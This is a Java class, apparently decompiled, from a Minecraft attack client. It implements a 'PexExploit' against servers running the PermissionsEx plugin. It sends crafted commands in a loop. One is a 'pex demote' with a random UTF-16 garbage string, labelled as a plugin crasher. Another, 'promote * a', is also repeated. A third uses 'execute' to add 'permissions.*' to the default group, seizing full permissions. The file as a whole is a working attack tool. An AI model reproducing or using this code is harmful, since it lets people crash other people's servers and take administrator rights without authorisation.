package us.whitedev.exploits.impl;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Locale;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class PexExploit implements Exploit {
   private static final String EXPLOIT_NAME = "PexExploit";
   private final char[] alphanumericsArray = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3];
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

      for(int i = 0; i < power; ++i) {
         String var5 = mode.toLowerCase(Locale.ROOT);
         byte var6 = -1;
         switch(var5.hashCode()) {
         case 110119:
            if (var5.equals("old")) {
               var6 = 2;
            }
            break;
         case 3377809:
            if (var5.equals("new1")) {
               var6 = 0;
            }
            break;
         case 3377810:
            if (var5.equals("new2")) {
               var6 = 1;
            }
         }

         switch(var6) {
         case 0:
            PacketHelper.sendCommand("pex demote $({^.#" + this.utf16() + "#.^})");
            break;
         case 1:
            PacketHelper.sendCommand("promote * a");
            break;
         case 2:
            PacketHelper.sendCommand("minecraft:execute @e ~ ~ ~ pex group default add permissions.*");
         }
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   public String getName() {
      return "PexExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"New1", "New2"}));
   }

   public String getArgsUsage() {
      return "power[1], mode[New1]";
   }

   public String getDescription() {
      return "PermissionsEx Plugin Crasher";
   }

   private String utf8() {
      StringBuilder out = new StringBuilder();

      for(long index = 0L; index < 74L; ++index) {
         out.append(this.alphanumericsArray[(int)this.nextLong((long)(this.alphanumericsArray.length - 1))]);
      }

      return out.toString();
   }

   private long nextLong(long bound) {
      return Math.round(Math.random() * (double)bound);
   }

   private String utf16() {
      return new String(this.utf8().getBytes(), StandardCharsets.UTF_16);
   }
}
